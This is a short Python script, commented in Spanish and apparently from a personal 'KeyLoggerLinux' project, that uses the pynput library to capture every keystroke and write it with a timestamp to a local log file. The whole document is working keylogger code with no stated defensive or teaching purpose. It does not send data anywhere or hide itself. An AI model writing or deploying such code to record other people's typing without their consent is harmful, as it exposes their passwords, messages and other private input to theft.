from pynput.keyboard import Key, Listener
import logging
# Locacion del archivo 
logging.basicConfig(filename="Codes/KeyLoggerLinux/test.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")
# Analizar teclado 
def on_press(key):
    logging.info(str(key))
 
with Listener(on_press=on_press) as listener :
    listener.join()
